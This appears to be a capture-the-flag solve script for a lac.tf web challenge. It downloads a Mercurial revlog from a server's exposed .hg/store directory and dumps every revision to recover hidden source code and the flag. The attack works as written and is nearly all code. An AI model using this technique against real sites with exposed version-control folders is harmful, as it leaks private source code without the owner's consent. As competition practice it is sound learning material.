#!/usr/bin/env python3
"""
Main ideas is to get a source leak using Mercurial revlogs.

Sources: https://www.mercurial-scm.org/wiki/Revlog
How to dump revlogs: https://www.mercurial-scm.org/repo/hg/file/default/contrib/dumprevlog

After investigating http://my-chemical-romance.lac.tf/.hg/dirstate, this leaks the name of
the main file (gerard_way2001.py). We can then use this script to dump the revlog of this
file and get the source code.

Make sure to install the dependencies by running:

pip install requests mercurial

Then run this script:
python3 solve.py | grep lactf
"""

import os, sys
import requests

from mercurial.node import hex
from mercurial import encoding, pycompat, revlog
from mercurial.utils import procutil

from mercurial.revlogutils import constants as revlog_constants

url = 'http://my-chemical-romance.lac.tf/'
filename = 'gerard__way2001.py.i'

res = requests.get(url + '/.hg/store/data/' + 'gerard__way2001.py.i')

with open('gerard__way2001.py.i', 'wb') as file:
    file.write(res.content)

for fp in (sys.stdin, sys.stdout, sys.stderr):
    procutil.setbinary(fp)

def binopen(path, mode=b'rb'):
    if b'b' not in mode:
        mode = mode + b'b'
    return open(path, pycompat.sysstr(mode))

binopen.options = {}

def printb(data, end=b'\n'):
    sys.stdout.flush()
    procutil.stdout.write(data + end)

localf = encoding.strtolocal(filename)
if not localf.endswith(b'.i'):
    print("file:", filename, file=sys.stderr)
    print("  invalid filename", file=sys.stderr)

r = revlog.revlog(binopen, target=(revlog_constants.KIND_OTHER, b'dump-revlog'), radix=localf[:-2], )

for i in r:
    n = r.node(i)
    p = r.parents(n)
    d = r.revision(n)
    printb(b"node: %s" % hex(n))
    printb(b"linkrev: %d" % r.linkrev(i))
    printb(b"parents: %s %s" % (hex(p[0]), hex(p[1])))
    printb(b"length: %d" % len(d))
    printb(b"-start-")
    printb(d)
    printb(b"-end-")

os.remove(filename)
